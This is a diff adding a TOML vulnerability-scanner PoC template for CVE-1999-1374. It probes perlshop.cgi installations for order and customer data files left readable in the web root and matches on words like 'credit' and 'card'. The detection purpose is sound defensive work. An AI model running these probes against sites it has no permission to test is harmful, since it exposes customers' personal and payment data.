@@ -1,0 +1,67 @@
+[info]
+author = "AVE"
+description = "检测 perlshop.cgi 购物车程序是否将客户敏感数据文件存储在 Web 根目录下可被直接访问"
+id = "POC-AVE-1999-1090"
+name = "perlshop.cgi 购物车程序敏感信息泄露漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-1999-1374",
+    "perlshop",
+    "information-disclosure",
+]
+vuln_id = [
+    "CVE-1999-1374",
+    "AVE-1999-1090",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/perlshop/orders.dat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order",
+    "credit",
+    "card",
+    "customer",
+    "total",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/shop/data/customers.dat"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "name",
+    "address",
+    "card",
+    "email",
+    "phone",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/perlshop.cgi"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "perlshop",
+    "shopping cart",
+    "checkout",
+]
